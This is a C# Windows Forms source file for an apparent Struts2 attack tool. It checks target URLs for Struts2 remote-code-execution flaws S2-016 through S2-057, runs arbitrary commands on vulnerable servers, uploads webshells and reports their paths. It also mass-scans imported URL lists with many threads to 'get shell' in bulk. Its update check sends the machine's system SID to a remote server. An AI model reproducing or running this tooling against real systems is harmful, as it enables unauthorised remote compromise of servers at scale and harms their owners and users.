using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using http;
using http.model;
using payload;
using file;
using System.Drawing;
using Amib.Threading;
using System.Net;
using tools;

namespace Test
{
    public partial class Main : Form
    {

        public int usertime = 0;
        public int timeout = 10;
        public int bt_thread_size = 100;

        public int bt_sucess = 0;
        public byte[] fbyte = null;
        public int bt_ok = 0;
        public String str16 = "";
        public List<String> bt_list_url = new List<String>();

        public List<String> bt_list_cmds = new List<String>();

        public List<String> bt_list_url_sucess = new List<String>();

        public Thread c_th;//批量验证线程

        public void restCount(){
            usertime = 0;
            bt_sucess = 0;
        }

        public Main()
        {
            InitializeComponent();
            Form.CheckForIllegalCrossThreadCalls = false;
        }

        private void btn_start_Click(object sender, EventArgs e)
        {
            if (this.txt_url.Text.Length < 1)
            {
                MessageBox.Show("请输入Struts2的URL地址，例如http://www.baidu.com/index.action");
            }
            this.btn_start.Enabled = false;
            Thread th = new Thread(new ThreadStart(checkOneVul));
            th.Start();
        }
        private static string UrlEncode(string str, Encoding oEnc)
        {
            if (string.IsNullOrEmpty(str))
            {
                return str;
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < str.Length; i++)
            {
                char c = str[i];
                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))
                {
                    stringBuilder.Append(c);
                }
                else
                {
                    byte[] bytes = oEnc.GetBytes(new char[] { c });
                    byte[] array = bytes;
                    for (int j = 0; j < array.Length; j++)
                    {
                        byte b = array[j];
                        stringBuilder.Append("%");
                        stringBuilder.Append(b.ToString("x2"));
                    }
                }
            }
            return stringBuilder.ToString();
        }
        public String request(String method, String url, String data, String exp, String cookie,String vulName)
        {
            try
            {

                HttpRequest request = new HttpRequest(url);
                request.Timeout = this.timeout * 1000;
                request.Cookie = cookie;

                if ("GET".Equals(method))
                {
                    if (url.EndsWith("?"))
                    {
                        url += data;
                    }
                    else
                    {
                        url += "?" + data;
                    }
                }
                else
                {
                    request.ContentType = "application/x-www-form-urlencoded";
                }


                if ("复杂数据".Equals(method))
                {
                    request.Method = "POST";
                    request.ContentType = "multipart/form-data";
                    request.AddMuHeader("\"" + data + "\"", "x");
                }
                else
                {
                    request.Method = method;
                }


                if ("S2-046".Equals(vulName))
                {
                    request.ContentType = "multipart/form-data";
                    if (!"".Equals(data))
                    {
                        String encodedata = System.Web.HttpUtility.UrlEncode(data).Replace("'", "%27");
                        exp = exp.Replace("[content]", encodedata);
                        data = "";
                    }
                    request.AddMuHeader("\"test\"; filename=\"" + exp + "\"\r\nContent-Type: text/plain", "x");
                    
                }

                else if ("S2-045".Equals(vulName))
                {
                    request.ContentType = exp;
                    
                }

                String body = request.GetBody(data);
                request.Body = body;
                ServerInfo server = HTTP.sendRequest(request);
                return server.body;
            }
            catch (Exception e)
            {

            }
            return "";


        }

        public Dictionary<String,String> requestGetHeader(String method, String url, String data, String exp, String cookie, String vulName)
        {
            try
            {
                int last = url.LastIndexOf("/");

                if (last != -1) {
                    url=url.Insert(last, "/"+ exp);
                }

                HttpRequest request = new HttpRequest(url);
                request.Timeout = this.timeout * 1000;
                request.Cookie = cookie;
                request.Method = method;
                if ("GET".Equals(method))
                {
                    if (url.EndsWith("?"))
                    {
                        url += data;
                    }
                    else
                    {
                        url += "?" + data;
                    }
                }
                else
                {
                    request.ContentType = "application/x-www-form-urlencoded";
                }


                String body = request.GetBody(data);
                request.Body = body;
                ServerInfo server = HTTP.sendRequest(request);
                return server.headers;
            }
            catch (Exception e)
            {

            }
            return new Dictionary<string, string>();


        }

        public BasePayload getPayload(String vulName)
        {
            BasePayload bp = null;
            if (vulName.Equals("S2-016"))
            {
                bp = new S2016();
            }

            else if (vulName.Equals("S2-019"))
            {

                bp = new S2019();
            }
            else if (vulName.Equals("S2-032"))
            {

                bp = new S2032();
            }
            else if (vulName.Equals("S2-037"))
            {

                bp = new S2037();
            }
            else if (vulName.Equals("S2-045"))
            {

                bp = new S2045();
            }
            else if (vulName.Equals("S2-046"))
            {

                bp = new S2046();
            }
            else if (vulName.Equals("S2-048"))
            {

                bp = new S2048();
            }
            else if (vulName.Equals("S2-057"))
            {

                bp = new S2057();
            }
            return bp;
        }

        public String checkVul(String url,String vul)
        {
           
            BasePayload bp = getPayload(vul);
            String method = this.cmb_method.Text;
            String cookie = this.txt_cookie.Text;
            String result = "";

            if (vul.Equals("S2-057"))
            {

                Dictionary<String,String> dic= requestGetHeader(method, url, "", bp.Get_Exp_Check(), cookie, vul);

                bool c=dic.TryGetValue("eresult", out result);
                if (result == null) {
                    result = "";
                }
                
            }
            else if (!vul.Equals("S2-045")&& !vul.Equals("S2-046"))
            {

                result = request(method, url, bp.Get_Exp_Check(), "", cookie,vul);
            }
            
            else
            {
                
                    result = request(method, url, "", bp.Get_Exp_Check(), cookie, vul);
                
                    
            }
            return result;
           

        }

        public void getVerinfo()
        {
            LogMessage("正在获取环境信息........");
            String url = this.txt_url.Text;

            String vul = this.com_vul.Text;
            BasePayload bp = getPayload(vul);
            String method = this.cmb_method.Text;
            String cookie = this.txt_cookie.Text;
            String result = "";
            if (url.Length <= 0)
            {
                LogWarning("警告：url为空！");
            }
            else if (vul.Equals("S2-057"))
            {

                Dictionary<String, String> dic = requestGetHeader(method, url, "", bp.Get_Exp_VerInfo("os.name"), cookie, vul);
               
                bool c = dic.TryGetValue("os.name", out result);
                if (result == null)
                {
                    result = "";
                }
                Dictionary<String, String> dic1 = requestGetHeader(method, url, "", bp.Get_Exp_VerInfo("os.version"), cookie, vul);
                String c1 = "";
                dic1.TryGetValue("os.version", out c1);
                result += "\r\n"+c1 +"\r\n";
                Dictionary<String, String> dic2 = requestGetHeader(method, url, "", bp.Get_Exp_Path(), cookie, vul);
                String c2 = "";
                dic2.TryGetValue("webpath", out c2);
                result += c2+"\r\n";
            }
            else if (!vul.Equals("S2-045") && !vul.Equals("S2-046"))
            {

                result = Tools.getContent(request(method, url, bp.Get_Exp_VerInfo("os.name"),"" , cookie, vul), vul) + "\r\n";
                result += Tools.getContent(request(method, url, bp.Get_Exp_VerInfo("os.version"), "", cookie, vul), vul) + "\r\n";
                result += Tools.getContent(request(method, url, bp.Get_Exp_Path(), "", cookie, vul), vul) + "\r\n";
            }
            else
            {
                result = Tools.getContent(request(method, url, "", bp.Get_Exp_VerInfo("os.name"), cookie, vul), vul) + "\r\n";
                result += Tools.getContent(request(method, url, "", bp.Get_Exp_VerInfo("os.version"), cookie, vul), vul) + "\r\n";
                result += Tools.getContent(request(method, url, "", bp.Get_Exp_Path(), cookie, vul), vul) + "\r\n";
            }
            this.txt_info.Text = result;
            LogWarning(result); 
            this.btn_verinfo.Enabled = true;
        }

        public void checkOneVul()
        {

            if (this.txt_url.Text.Length <= 0)
            {
                LogWarning("警告：url为空！");
                return;
            }
            String vul = this.com_vul.Text;
            String url = this.txt_url.Text;
            if (this.com_vul.SelectedIndex == 0){
                for (int i = 1; i < this.com_vul.Items.Count; i++) {
                    String cvul = this.com_vul.Items[i].ToString();
                    String result = checkVul(url, cvul);
                    if (result.IndexOf("struts2_security_check") != -1)
                    {
                        LogError("警告：存在Struts2远程代码执行漏洞-编号" + cvul);
                        LogMessage("返回验证标志：" + Tools.getContent(result, cvul));
                    }
                    else{
                        LogWarning(url+"-----不存在Struts2 " + cvul + "远程代码执行漏洞！");
                    }
                }
            }
            else{
                String result = checkVul(url, vul);
                String a = result;
                if (result.IndexOf("struts2_security_check") != -1)
                {
                    MessageBox.Show("警告：存在Struts2远程代码执行漏洞-编号" + vul);
                    LogError("警告：存在Struts2远程代码执行漏洞-编号" + vul);
                    LogMessage("返回验证标志：" + Tools.getContent(result, vul));
                }
                else
                {
                    MessageBox.Show(url + "-----不存在Struts2 " + vul + "远程代码执行漏洞！");
                }
            }
            LogMessage("验证完毕......");
            this.btn_start.Enabled = true;
        }
        public void executeOneCmd()
        {
            String method = this.cmb_method.Text;
            String url = this.txt_url.Text;
            String cookie = this.txt_cookie.Text;
            String cmd = this.comb_cmd.Text;
            if (cmd.Equals(""))
            {
                MessageBox.Show("命令为空........");
                return;
            }
            this.txt_cmdResult.Text = Tools.getContent(executeCmd(cmd, method, url, cookie,this.com_vul.Text), this.com_vul.Text);
            this.btn_startCmd.Enabled = true;
        }

        public String executeCmd(String cmd, String method, String url, String cookie,String vulName)
        {
            LogMessage("正在执行命令中，请稍等片刻........");
            String cmdstr = Uri.EscapeDataString(cmd);
            BasePayload bp = getPayload(vulName);
            String result = "";
            if (vulName.Equals("S2-057"))
            {
                Dictionary<String, String> dic = requestGetHeader(method, url, "", bp.Get_Exp_Exec(cmd), cookie, vulName);

                bool c = dic.TryGetValue("cmd", out result);
                if (result == null)
                {
                    result = "";
                }
            }
            else if (!vulName.Equals("S2-045") && !vulName.Equals("S2-046"))
            {
                result = request(method, url, bp.Get_Exp_Exec(cmdstr), "", cookie, vulName);
            }
            else
            {
                result = request(method, url, "", bp.Get_Exp_Exec(cmd), cookie, vulName);
            }
            LogMessage("执行完成！");
            if (!string.IsNullOrEmpty(result))
            {
                return result.Replace("\n", "\r\n");
            }
            else
            {
                return "";
            }

        }

        public void executeBatchCmd(Object url)
        {
            LogMessage("正在批量执行命令中，请稍等片刻");
            foreach (String cmd in bt_list_cmds)
            {
                LogMessage("正在批量执行[" + cmd + "]，请稍等片刻........");
                executeCmd(cmd,this.cmb_method.Text,url.ToString(),this.txt_cookie.Text,this.com_vul.Text);
                LogWarning("执行[" + cmd + "]完毕");
            }
            LogWarning("批量命令执行完毕........");
            this.btn_exeBatchCMD.Enabled = true;
        }

        public static int version = 20190925;
        public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=Struts2VulsTools&NO=" + URLEncode.UrlEncode(Tools.getSystemSid()) + "&VERSION=" + version;
        //检查更新
        public void checkUpdate()
        {
            try
            {
                String[] result = HttpTools.getHtml(versionURL, 30).Split('-');
                String versionText = result[0];
                int cversion = int.Parse(result[1]);
                String versionUpdateURL = result[2];
                if (cversion > version)
                {
                    DialogResult dr = MessageBox.Show("发现新版本：" + versionText + "，更新日期：" + cversion + "，立即更新吗？", "提示", MessageBoxButtons.OKCancel);

                    if (DialogResult.OK.Equals(dr))
                    {
                        try
                        {
                            int index = versionUpdateURL.LastIndexOf("/");
                            String filename = "update.rar";
                            if (index != -1)
                            {
                                filename = versionUpdateURL.Substring(index);
                            }
                            HttpDownloadFile(versionUpdateURL, AppDomain.CurrentDomain.BaseDirectory + filename);
                            MessageBox.Show("更新成功，请将压缩包解压后运行！");
                        }

                        catch (Exception other)
                        {
                            MessageBox.Show("更新失败，请访问官网更新！" + other.GetBaseException());
                        }
                    }
                }
                else
                {
                    this.rtxt_log.Invoke(new LogDelegate(LogMessage), "自动检查更新，没有发现新版本！");
                }
            }
            catch (Exception e)
            {
                this.rtxt_log.Invoke(new LogDelegate(LogWarning), "无法连接更新服务器！" + e.Message);
            }
        }
        public void HttpDownloadFile(string url, string path)
        {
            // 设置参数
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;

            //发送请求并获取相应回应数据
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            //直到request.GetResponse()程序才开始向目标网页发送Post请求
            Stream responseStream = response.GetResponseStream();
            long sum = response.ContentLength;
            //创建本地文件写入流
            Stream stream = new FileStream(path, FileMode.Create);

            byte[] bArr = new byte[1024];
            int size = responseStream.Read(bArr, 0, (int)bArr.Length);
            int csum = 0;
            csum += size;
            while (size > 0)
            {
                stream.Write(bArr, 0, size);
                size = responseStream.Read(bArr, 0, (int)bArr.Length);
                csum += size;
                int val = (int)(csum * 100 / sum);
                this.lbl_info.Text = "下载更新文件：" + val + "%";
            }
            this.lbl_info.Text = "下载更新文件完成！";
            stream.Close();
            responseStream.Close();
        }

        private void btn_upload_Click(object sender, EventArgs e)
        {
            if (this.com_vul.SelectedIndex == 0) {
                MessageBox.Show("请选择漏洞编号！");
                return;
            }
            Thread th = new Thread(new ThreadStart(uploadFile));
            th.Start();
            this.btn_upload.Enabled = false;
        }

        public void uploadFile()
        {
            String shellName = this.txt_shellName.Text;
            String shellPath = this.txt_shellPath.Text;
            String url = this.txt_url.Text;
            String cookie = this.txt_cookie.Text;
            String result = Tools.getContent(uploadFile(url,shellPath, shellName,cookie,this.com_vul.Text), this.com_vul.Text);
            String path = "";
            String pathfilename = "";
            if (result.IndexOf("okokok") != -1)
            {
                if (this.setUploudPath.Checked&& !"".Equals(shellPath))
                {

                    path = shellPath;
                    pathfilename = shellPath + shellName;
                }
                else {
                    pathfilename = getFilePath(url, result, shellName);
                }
                MessageBox.Show("上传成功----" + pathfilename);

                LogError("上传访问路径：" + pathfilename);
            }
            else {
                LogError("上传失败！");
            }
            LogMessage("上传返回信息/上下文目录" + result + "........");
            this.btn_upload.Enabled = true;
        }

        public String getFilePath(String url,String result,String fileName) {

          String rootPath=  Tools.GetRootPath(url);  
            int c = result.IndexOf("okokok/");
            if (c != -1)
            {
                String cpath = result.Substring(c);
                return rootPath + result.Replace("okokok","")+ "/"+ fileName;
            }
            else {
                return "未获取到shell路径，请人工访问。";
            }
        }

        public String uploadFile(String url,String shellPath,String shellName,String cookie,String vulName)
        {
            LogMessage("正在上传文件，请稍等片刻........");
            String method = this.cmb_method.Text;
            String fileContent = this.txt_shellContent.Text;
            String fileContent_encode = System.Web.HttpUtility.UrlEncode(fileContent, Encoding.UTF8);
            String path = "";
            if (this.setUploudPath.Checked && !"".Equals(shellPath))
            {
                path = shellPath;
            }
            BasePayload bp = getPayload(vulName);
            
            String result = "";
            if (!vulName.Equals("S2-045") && !vulName.Equals("S2-046"))
            {
                
                result = request(method, url, bp.Get_Exp_Upload(path, shellName, fileContent_encode), "", cookie, vulName);
            }
            else
            {               
                result = request(method, url, fileContent, bp.Get_Exp_Upload(path, shellName, ""), cookie, vulName);
            }

            return result;
        }
      
        public delegate void LogAppendDelegate(Color color, String text);
        public delegate void LogDelegate(String text);

        /// <summary> 
        /// 追加显示文本 
        /// </summary> 
        /// <param name="color">文本颜色</param> 
        /// <param name="text">显示文本</param> 
        public void LogAppend(Color color, String text)
        {
            this.rtxt_log.SelectionColor = color;
            this.rtxt_log.HideSelection = false;
            this.rtxt_log.AppendText(text);
            this.rtxt_log.AppendText("\r\n");
        }
        /// <summary> 
        /// 显示错误日志 
        /// </summary> 
        /// <param name="text"></param> 
        public void LogError(String text)
        {
            LogAppendDelegate la = new LogAppendDelegate(LogAppend);
            this.Invoke(la, Color.Red, DateTime.Now+"----"+ text);
        }
        /// <summary> 
        /// 显示警告信息 
        /// </summary> 
        /// <param name="text"></param> 
        public void LogWarning(String text)
        {
            LogAppendDelegate la = new LogAppendDelegate(LogAppend);
            this.Invoke(la, Color.Violet, DateTime.Now + "----" + text);
        }
        /// <summary> 
        /// 显示信息 
        /// </summary> 
        /// <param name="text"></param> 
        public void LogMessage(String text)
        {
            LogAppendDelegate la = new LogAppendDelegate(LogAppend);
            this.Invoke(la, Color.Black, DateTime.Now + "----" + text);
        }


        private void btn_startCmd_Click(object sender, EventArgs e)
        {
            if (this.com_vul.SelectedIndex == 0)
            {
                MessageBox.Show("请选择漏洞编号！");
                return;
            }
            Thread th = new Thread(new ThreadStart(executeOneCmd));
            th.Start();
            this.btn_startCmd.Enabled = false;
        }
        public SmartThreadPool stp=new SmartThreadPool(50,1,1);
        //扫描方法
        public void scan(Object config)
        {
            Config cfg = (Config)config;
            stp = new SmartThreadPool(50, bt_thread_size, bt_thread_size);
            foreach (String url in this.bt_list_url) {
                RunData rd = new RunData();
                rd.CFG = cfg;
                rd.URL = url;
                stp.QueueWorkItem<Object>(batchGetShell, rd);
            }
            
            stp.WaitForIdle();
            stopScan();
        }



        //停止getshell扫描
        public void stopScan()
        {
            LogMessage("正在停止线程......");
            if (c_th != null)
            {
                c_th.Abort();
            }
            
            while ( stp.InUseThreads>0) {
                Thread.Sleep(1000);
                LogMessage("还有"+ stp.InUseThreads+"个线程在运行中！");
            }
            stp.Shutdown();
            //停止计时器
            this.tim_bt.Enabled = false;
          
            updateStatus();
            restCount();
            this.btn_bt_getshell.Enabled = true;
            LogMessage("任务线程已经停止！");
            
            this.btn_bt_stop.Enabled = true;
        }

        public void batchGetShell(Object rundata)
        {
            RunData rd = (RunData)(rundata);

            Config cfg = (Config)rd.CFG;
            String cvulName = "";
            String path = "";
           
            
            foreach (String vul in cfg.VulNameS) {
                String result = checkVul(rd.URL, vul);
                if (result.IndexOf("struts2_security_check") != -1)
                {
                    LogError("提示：" + rd.URL + "----存在漏洞----" + vul+ "验证标志：" + result+ "，发现漏洞停止检查其他编号！");
                    cvulName = vul;
                    break;
                }/*
                    else
                    {
                        LogWarning("提示：" + url + "----不存在漏洞----" + cvul);
                    }*/
            }

            if (!String.IsNullOrEmpty(cvulName))
            {
                this.bt_ok++;
                ListViewItem item = new ListViewItem(bt_ok.ToString());
                item.SubItems.Add(rd.URL);
                item.SubItems.Add(cvulName);
                path += rd.URL+"----"+cvulName;
                if (cfg.isUpFile)
                {
                    //上传文件
                    LogMessage("正在上传文件中，请稍等片刻........");
                    String result = uploadFile(rd.URL, "", cfg.FileName, "", cvulName);

                    if (result.IndexOf("okokok") == -1)
                    {
                        item.SubItems.Add("上传文件失败");
                        LogWarning("上传文件失败........");
                        path += "----上传文件失败";
                    }
                    else
                    {
                        LogError("上传成功........");
                        String shellpath = getFilePath(rd.URL, result, cfg.FileName);
                        item.SubItems.Add(shellpath);
                        path += "----" + shellpath;
                    }
                }
                else
                {
                    path += "----没有选择上传文件";
                    item.SubItems.Add("没有选择上传文件！");
                }
                String cmd_result = "";
                if (cfg.isExeCMD && this.bt_list_cmds.Count != 0)
                {

                    foreach (String cmd in this.bt_list_cmds)
                    {
                        LogMessage("正在批量执行[" + cmd + "]，请稍等片刻........");
                        cmd_result+=executeCmd(cmd, cfg.Method, rd.URL, "", cvulName)+"====";
                    }
                    cmd_result += "执行命令完成！";
                    LogMessage(cmd_result);
                }
                else {
                    cmd_result = "未选择批量执行命令或未设置执行命令！";
                }
                path += "----"+cmd_result;
                item.SubItems.Add(cmd_result);
                this.Invoke(new addItem(addItemToList), item);
                LogWarning(path);
            }
            else {
                LogWarning(rd.URL+"----不存在漏洞！");
            }
            bt_sucess++;

        }

        delegate void addItem(ListViewItem lvi);

        public void addItemToList(ListViewItem lvi)
        {
            this.bt_lvw.Items.Add(lvi);

        }

        private void txt_info_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.A)
            {
                this.txt_info.SelectAll();
            }

        }

        private void txt_cmdResult_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.A)
            {
                this.txt_cmdResult.SelectAll();
            }
        }

        private void txt_shellContent_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode == Keys.A)
            {
                this.txt_shellContent.SelectAll();
            }
        }

        private void btn_import_url_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                this.txt_bt_url_path.Text = ofd.FileName;
                FileStream fs = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read);
                StreamReader sr = new StreamReader(fs);
                String url = null;
                bt_list_url.Clear();
                while ((url = sr.ReadLine()) != null)
                {
                    int sindex = url.IndexOf("?");
                    if (sindex != -1)
                    {
                        url = url.Substring(0, sindex);
                    }
                    if (bt_list_url.Contains(url) == false)
                    {
                        bt_list_url.Add(url);
                    }
                }
                MessageBox.Show("加载列表成功！");
                this.lbl_bt_sum.Text = this.bt_list_url.Count + "";
            }
        }
        public delegate void updateTheStatus();
        public void updateStatus()
        {
            this.lbl_bt_usetime.Text = this.usertime + "秒";
            this.lbl_bt_sucess.Text =this.bt_list_url.Count- stp.CurrentWorkItemsCount + "";
            this.lbl_bt_ok.Text = this.bt_ok + "";
        }
        private void tim_bt_Tick(object sender, EventArgs e)
        {
            this.usertime++;
            updateStatus();
        }
        
        private void btn_bt_getshell_Click(object sender, EventArgs e)
        {
            if (this.bt_list_url.Count == 0)
            {
                MessageBox.Show("请导入列表");
                return;
            }
            Config cfg = new Config();
            this.btn_bt_getshell.Enabled = false;
            bt_list_url_sucess.Clear();
            this.bt_lvw.Items.Clear();
            this.bt_ok = 0;
            this.tim_bt.Enabled = true;
            this.tim_bt.Start();
            if (this.com_vul.SelectedIndex == 0)
            {
                for (int i = 1; i < this.com_vul.Items.Count; i++)
                {
                    String cvul = this.com_vul.Items[i].ToString();
                    cfg.VulNameS.Add(cvul);
                }
            }
            else {
                cfg.VulNameS.Add(this.com_vul.Text);
            }
            cfg.FileName = this.txt_batchShellName.Text;
            cfg.FileContent = this.txt_shellContent.Text;
            cfg.Method = this.cmb_method.Text;
            cfg.isUpFile = this.chk_batchUploadFile.Checked;
            cfg.isExeCMD = this.chk_batchEXcCMD.Checked;
            try
            {
                this.bt_thread_size = int.Parse(this.cmb_thread_size.Text);
            }
            catch
            {
                MessageBox.Show("线程设置错误，将默认使用" + this.bt_thread_size + "个线程！");
            }
            
            c_th = new Thread(scan);
            c_th.Start(cfg);


        }

        private void btn_bt_stop_Click(object sender, EventArgs e)
        {
            stp.Shutdown(false,1000);
            this.btn_bt_stop.Enabled = false;
            Thread th = new Thread(stopScan);
            th.Start();
            
        }

        private void btn_export_url_Click(object sender, EventArgs e)
        {
            if (this.bt_lvw.Items.Count == 0)
            {
                MessageBox.Show("抱歉，没有数据！");
                return;
            }
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "文本文件|*.csv";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                
                try
                {
                    FileStream fs = new FileStream(sfd.FileName, FileMode.OpenOrCreate, FileAccess.Write);
                    StreamWriter sw = new StreamWriter(fs,Encoding.Default);
                    sw.WriteLine("\"测试URL\",\"漏洞编号\",\"磁盘路径\"，\"命令执行\"");
                    foreach (ListViewItem sv in this.bt_lvw.Items)
                    {
                        StringBuilder sb = new StringBuilder();
                        foreach (ListViewItem.ListViewSubItem subv in sv.SubItems)
                        {
                            sb.Append("\"" + subv.Text + "\",");
                        }
                        sb.Remove(sb.Length - 1, 1);
                        sw.WriteLine(sb.ToString());
                    }
                    sw.Close();
                    fs.Close();
                }
                catch (Exception ee)
                {
                    MessageBox.Show("导出数据发生异常！");
                }
                MessageBox.Show("导出成功！");
            }
        }

  

        public String base64Decode(String str)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(str));
        }

        private void btn_exeBatchCMD_Click(object sender, EventArgs e)
        {
            if (this.com_vul.SelectedIndex == 0)
            {
                MessageBox.Show("请选择漏洞编号！");
                return;
            }
            Thread th = new Thread(new ParameterizedThreadStart(executeBatchCmd));
            th.Start(this.txt_url.Text);
            this.btn_exeBatchCMD.Enabled = false;
        }

        private void Main_Shown(object sender, EventArgs e)
        {
            bt_list_cmds = FileTool.readFileToList(AppDomain.CurrentDomain.BaseDirectory + "/cmd.txt");
            this.cmb_method.SelectedIndex = 1;
            this.com_timeout.SelectedIndex = 2;
            this.cmb_thread_size.SelectedIndex = 7;
            this.com_vul.SelectedIndex = 0;
            this.comb_cmd.SelectedIndex = 0;
            new Thread(checkUpdate).Start();
        }

        private void btn_verinfo_Click(object sender, EventArgs e)
        {
            if (this.com_vul.SelectedIndex == 0)
            {
                MessageBox.Show("请选择漏洞编号！");
                return;
            }
            if (this.txt_url.Text.Length < 1)
            {
                MessageBox.Show("请输入Struts2的URL地址，例如http://www.baidu.com/index.action");
            }
            Thread th = new Thread(new ThreadStart(getVerinfo));
            th.Start();
            this.btn_verinfo.Enabled = false;
        }

        private void cmb_thread_size_TextChanged(object sender, EventArgs e)
        {
            bt_thread_size = int.Parse(this.cmb_thread_size.Text);
            stp.MinThreads = bt_thread_size;
            stp.MaxThreads = bt_thread_size;
           

        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }
        public void openURL(int index) {

            if (this.bt_lvw.SelectedItems.Count == 0)
            {
                return;
            }
            string target = this.bt_lvw.SelectedItems[0].SubItems[index].Text;

            try
            {

                System.Diagnostics.Process.Start("IEXPLORE.EXE", target);

            }
            catch (Exception oe)
            {
                MessageBox.Show("无法打开IE---" + oe.Message);
            }
        }
        private void tsmi_open_test_url_Click(object sender, EventArgs e)
        {
            openURL(1); 
        }

        private void tsmi_setTargetURL_Click(object sender, EventArgs e)
        {
            if (this.bt_lvw.SelectedItems.Count == 0)
            {
                return;
            }
            string target = this.bt_lvw.SelectedItems[0].SubItems[1].Text;

            this.txt_url.Text = target;
        }

        private void tsmi_delete_Click(object sender, EventArgs e)
        {
            if (this.bt_lvw.SelectedItems.Count == 0)
            {
                return;
            }

            this.bt_lvw.Items.Remove(this.bt_lvw.SelectedItems[0]);
        }

        private void tsmi_openFileURL_Click(object sender, EventArgs e)
        {
            openURL(3);
        }

        private void bt_lvw_DoubleClick(object sender, EventArgs e)
        {
            openURL(1);
        }

        private void tsmi_clear_Click(object sender, EventArgs e)
        {
            this.bt_lvw.Items.Clear();
        }

        private void chk_batchUploadFile_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void com_timeout_TextChanged(object sender, EventArgs e)
        {
            this.timeout = int.Parse(this.com_timeout.Text);
        }

        private void cmb_method_TextChanged(object sender, EventArgs e)
        {
            if (this.cmb_method.Text.Equals("复杂数据") && (this.com_vul.Text.Equals("S2-045")|| this.com_vul.Text.Equals("S2-046"))) {
                MessageBox.Show("S2-045,S2-046不支持复杂数据类型提交！");
            }
        }

        private void com_vul_TextChanged(object sender, EventArgs e)
        {
            if (this.cmb_method.Text.Equals("复杂数据") && (this.com_vul.Text.Equals("S2-045") || this.com_vul.Text.Equals("S2-046")))
            {
                MessageBox.Show("S2-045,S2-046不支持复杂数据类型提交！");
            }
        }

        private void setUploudPath_CheckStateChanged(object sender, EventArgs e)
        {
            if (this.setUploudPath.Checked)
            {
                this.txt_shellPath.Enabled = true;
            }
            else
            {
                this.txt_shellPath.Enabled = false;
            }
        }
    }
}